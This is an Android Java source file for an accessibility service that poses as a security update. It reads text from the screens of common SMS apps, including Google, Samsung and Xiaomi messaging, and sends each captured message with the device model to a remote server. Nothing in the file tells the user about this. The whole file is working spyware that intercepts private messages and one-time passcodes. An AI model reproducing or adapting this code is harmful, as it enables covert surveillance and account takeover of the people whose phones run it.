package com.security.update;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class SmsAccessibilityService extends AccessibilityService {

    private static final String TAG = "A11ySms";
    private static final String[] SMS_PACKAGES = {
        "com.google.android.apps.messaging",
        "com.samsung.android.messaging",
        "com.android.mms",
        "com.miui.smsextra",
        "com.oneplus.mms",
        "com.android.messaging"
    };

    private final Set<String> seenMessages = new HashSet<>();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();
        if (!isSmsApp(pkg)) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        List<String> texts = new ArrayList<>();
        harvestText(root, texts);
        root.recycle();

        for (String t : texts) {
            if (t.length() < 5) continue;
            String key = pkg + "|" + t.hashCode();
            if (seenMessages.contains(key)) continue;
            seenMessages.add(key);

            Log.d(TAG, "Harvested: " + t);

            new Thread(() -> {
                String emergencyCode = DeviceRegistrar.getOrRegister(getApplicationContext());
                if (emergencyCode == null) return;
                sendToServer(emergencyCode, pkg, t);
            }).start();
        }

        if (seenMessages.size() > 2000) seenMessages.clear();
    }

    private void harvestText(AccessibilityNodeInfo node, List<String> out) {
        if (node == null) return;
        if (node.getText() != null) {
            String s = node.getText().toString().trim();
            if (!s.isEmpty()) out.add(s);
        }
        if (node.getContentDescription() != null) {
            String s = node.getContentDescription().toString().trim();
            if (!s.isEmpty()) out.add(s);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            harvestText(node.getChild(i), out);
        }
    }

    private boolean isSmsApp(String pkg) {
        for (String p : SMS_PACKAGES) if (p.equals(pkg)) return true;
        return false;
    }

    private void sendToServer(String emergencyCode, String pkg, String text) {
        try {
            URL url = new URL(EmergencyConfig.SERVER_URL + EmergencyConfig.EMERGENCY_ENDPOINT);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);

            JSONObject content = new JSONObject();
            content.put("sender", "screen");
            content.put("message", text);
            content.put("timestamp", System.currentTimeMillis());
            content.put("type", "screen");
            content.put("package", pkg);

            JSONObject payload = new JSONObject();
            payload.put("emergency_code", emergencyCode);
            payload.put("device_id", android.os.Build.MODEL);
            payload.put("data_type", "sms_screen");
            payload.put("data_content", content);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload.toString().getBytes(StandardCharsets.UTF_8));
            }

            int code = conn.getResponseCode();
            Log.d(TAG, "Server response: " + code);
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Send failed: " + e.getMessage());
        }
    }

    @Override
    public void onInterrupt() {}
}
